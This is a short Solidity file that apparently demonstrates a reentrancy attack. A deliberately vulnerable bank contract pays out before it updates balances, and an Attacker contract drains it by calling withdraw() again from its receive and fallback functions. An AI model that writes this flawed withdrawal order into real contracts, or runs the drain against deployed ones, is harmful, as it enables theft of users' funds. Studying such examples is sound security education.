// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Vulnerable {

    mapping(address => uint) balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] = msg.value;
    }

    function withdraw() external {
        uint256 amount = balanceOf[msg.sender];
        (bool success, ) = msg.sender.call{value:amount}("");
        require(success, "Transfer failed.");
        balanceOf[msg.sender] = 0;
    }

    receive() external payable {
        balanceOf[msg.sender] = msg.value;
    }

    fallback() external payable {
        balanceOf[msg.sender] = msg.value;
    }
}

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external; 
    function dummy() external payable; 
}

contract Attacker {
    IVulnerable bank;

    event Log(address indexed sender, uint value, string message);

    constructor(IVulnerable _bank) payable {
        bank = _bank;
    }

    function attack() external {
        bank.dummy{value: 1 ether}();
        bank.withdraw();
    } 

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }

        emit Log(msg.sender, msg.value, 'receive');   
    }

    fallback() external payable{
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
        
        emit Log(msg.sender, msg.value, 'fallback');   
    }
}
